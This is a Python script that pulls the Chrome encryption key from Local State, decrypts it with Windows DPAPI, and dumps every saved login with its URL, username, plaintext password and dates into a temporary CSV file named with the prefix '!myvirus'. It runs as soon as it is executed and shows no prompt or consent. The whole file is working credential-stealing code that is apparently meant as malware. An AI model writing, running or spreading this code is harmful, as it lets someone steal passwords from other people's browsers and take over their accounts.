import os
import json
import base64
import sqlite3
from tkinter import CURRENT
import win32crypt
from Crypto.Cipher import AES
import shutil
from tempfile import TemporaryFile, gettempdir
from datetime import timezone, datetime, timedelta
import csv
CURRENT_DIR = os.path.dirname(os.path.realpath(__file__))
CHROME_PASSWORDS_FILE = TemporaryFile(prefix='!myvirus', mode='w', delete=False, suffix=f'{os.getlogin()}.csv', newline='')
writer = csv.writer(CHROME_PASSWORDS_FILE)
writer.writerow(["URL", "USERNAME", "PASSWORD", "CREATION-DATE", "LAST-ACCESSED"])

def get_chrome_datetime(chromedate):
    """Return a `datetime.datetime` object from a chrome format datetime
    Since `chromedate` is formatted as the number of microseconds since January, 1601"""
    return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)
 
def get_encryption_key():
    local_state_path = os.path.join(os.environ["USERPROFILE"],
                                    "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = f.read()
        local_state = json.loads(local_state)

    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    key = key[5:]
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

def decrypt_password(password, key):
    try:
        # get the initialization vector
        iv = password[3:15]
        password = password[15:]
        # generate cipher
        cipher = AES.new(key, AES.MODE_GCM, iv)
        # decrypt password
        return cipher.decrypt(password)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            # not supported
            return ""

def save_chrome_passwords():

    key = get_encryption_key()
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                            "Google", "Chrome", "User Data", "default", "Login Data")
    filename = "ChromeData.db"

    shutil.copyfile(db_path, filename)
    db = sqlite3.connect(filename)
    cursor = db.cursor()
    cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
    password_count = 0
    for row in cursor.fetchall():
        print(row)
        origin_url = row[0]
        action_url = row[1]
        username = row[2]
        password = decrypt_password(row[3], key)
        date_created = row[4]
        date_last_used = row[5]        
        if username or password:
            writer.writerow([origin_url, username, password, {str(get_chrome_datetime(date_created))}, {str(get_chrome_datetime(date_last_used))}])
            password_count+=1
    cursor.close()
    db.close()
    try:
        # try to remove the copied db file
        os.remove(filename)
    except:
        pass
save_chrome_passwords()